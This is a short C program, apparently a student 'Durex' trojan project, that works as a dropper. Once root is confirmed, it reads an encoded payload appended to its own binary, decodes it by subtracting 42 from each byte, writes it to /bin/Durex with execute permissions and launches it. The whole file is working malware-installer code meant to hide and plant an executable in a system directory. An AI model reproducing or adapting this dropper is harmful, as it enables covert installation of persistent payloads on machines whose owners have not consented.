#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

static char	*ft_decrypt(char *buff, off_t size)
{
	off_t	i = 0;

	while (i < size)
	{
		buff[i] -= 42;
		++i;
	}
	return (buff);
}

static bool	check_root(void)
{
	if (getuid() != 0)
	{
		puts("Permission denied. Are you root ?");
		return (false);
	}
	return (true);
}


int	main(int argc, char **argv)
{
	int	fd = 0;
	off_t	size_daemon = 0;
	struct stat	st;

	(void)argc;
	if (check_root() == false)
		return (false);
	puts("rabougue\nkbensado");
	fd = open(argv[0], O_RDONLY);
	if (fd == -1)
	{
		perror("open");
		exit(errno);
	}
	fstat(fd, &st);
	if (lseek(fd, (off_t)st.st_size - (off_t)sizeof(size_daemon), SEEK_SET) == -1)
	{
		perror("lseek");
		exit(errno);
	}
	if (read(fd, &size_daemon, sizeof(size_daemon)) < 1)
	{
		perror("read");
		exit(errno);
	}
	close(fd);

	fd = open(argv[0], O_RDONLY);
	if (fd == -1)
	{
		perror("open");
		exit(errno);
	}
	lseek(fd, size_daemon, SEEK_SET);

	char	buff[st.st_size - size_daemon];
	memset(&buff, 0, sizeof(buff));

	read(fd, &buff, sizeof(buff));
	ft_decrypt(buff, (off_t)sizeof(buff));
	close(fd);
	remove("/bin/Durex");
	if ((fd = open("/bin/Durex", O_CREAT | O_RDWR, 0744)) == -1)
	{
		perror("open");
		return (errno);
	}
	write(fd, &buff, sizeof(buff));
	//temporaire
	char	*exec[] = {"/bin/Durex", NULL};
	if (execve(exec[0], exec, NULL) == -1)
	{
		perror("execve");
	}

	close(fd);
}
